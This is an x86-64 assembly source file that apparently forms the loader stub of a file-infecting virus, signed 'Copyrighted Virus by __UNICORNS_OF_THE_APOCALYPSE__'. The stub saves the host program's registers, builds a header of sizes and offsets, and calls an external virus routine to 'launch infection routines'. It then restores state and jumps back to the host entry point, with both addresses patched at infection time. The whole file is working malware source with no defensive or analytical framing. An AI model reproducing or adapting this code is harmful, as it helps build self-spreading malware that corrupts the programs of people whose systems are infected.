section .text
	global loader_entry
	global call_virus
	global jump_back_to_client
	global loader_exit
	global virus_header_struct

extern virus

;----------------------------------; backup all swappable registers
;                                    (all but rax, rsp, rbp)
loader_entry:
	pushfq                     ; backup flags
	push rcx                   ; backup rcx
	push rdx                   ; backup rdx
	push rbx                   ; backup rbx
	push rsi                   ; backup rsi
	push rdi                   ; backup rdi
	push r8                    ; backup r8
	push r9                    ; backup r9
	push r10                   ; backup r10
	push r11                   ; backup r11
	push r12                   ; backup r12
	push r13                   ; backup r13
	push r14                   ; backup r14
	push r15                   ; backup r15

	mov rcx, 0
	mov rdx, 0
	mov rbx, 0
	mov rsi, 0
	mov rdi, 0
	mov r8, 0
	mov r9, 0
	mov r10, 0
	mov r11, 0
	mov r12, 0
	mov r13, 0
	mov r14, 0
	mov r15, 0

;----------------------------------; launch infection routines

; allocate space for structure fields
	sub rsp, end_virus_header - virus_header_struct

; dist_client_loader
	lea rcx, [rel virus_header_struct + 0x38]
	mov rcx, [rcx]
	mov [rsp + 0x38], rcx
; dist_header_loader
	lea rdx, [rel virus_header_struct + 0x30]
	mov rdx, [rdx]
	mov [rsp + 0x30], rdx
; dist_vircall_loader
	lea rbx, [rel virus_header_struct + 0x28]
	mov rbx, [rbx]
	mov [rsp + 0x28], rbx
; dist_virus_loader
	lea rsi, [rel virus_header_struct + 0x20]
	mov rsi, [rsi]
	mov [rsp + 0x20], rsi
; loader_size
	lea rdi, [rel virus_header_struct + 0x18]
	mov rdi, [rdi]
	mov [rsp + 0x18], rdi
; loader_entry
	lea r8, [rel loader_entry]
	mov [rsp + 0x10], r8
; virus_size
	lea r9, [rel virus_header_struct + 0x8]
	mov r9, [r9]
	mov [rsp + 0x8], r9
; seed
	lea r10, [rel virus_header_struct]
	mov r10, [r10]
	mov [rsp], r10
; pass structure address
	mov rdi, rsp
call_virus:
	call virus                 ; address rewritten by virus

; free structure fields space
	add rsp, end_virus_header - virus_header_struct

;----------------------------------; restore registers

return_to_client:
	pop r15                    ; restore r15
	pop r14                    ; restore r14
	pop r13                    ; restore r13
	pop r12                    ; restore r12
	pop r11                    ; restore r11
	pop r10                    ; restore r10
	pop r9                     ; restore r9
	pop r8                     ; restore r8
	pop rdi                    ; restore rdi
	pop rsi                    ; restore rsi
	pop rbx                    ; restore rbx
	pop rdx                    ; restore rdx
	pop rcx                    ; restore rcx
	popfq                      ; restore flags
jump_back_to_client:
	jmp 0xffffffff             ; address rewritten by virus
loader_exit:

virus_header_struct:
	db 0xD5, 0xEE, 0xF5, 0xE1, 0xAD, 0xDB, 0xDE, 0xFA ; virus seed (placeholder)
	dq loader_entry                                   ; virus size (placeholder)
	dq loader_entry                                   ; loader entry (placeholder)
	dq loader_entry                                   ; loader_size
	dq loader_entry                                   ; dist_virus_loader
	dq loader_entry                                   ; dist_vircall_loader
	dq loader_entry                                   ; dist_header_loader
	dq loader_entry                                   ; dist_client_loader
end_virus_header:
	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
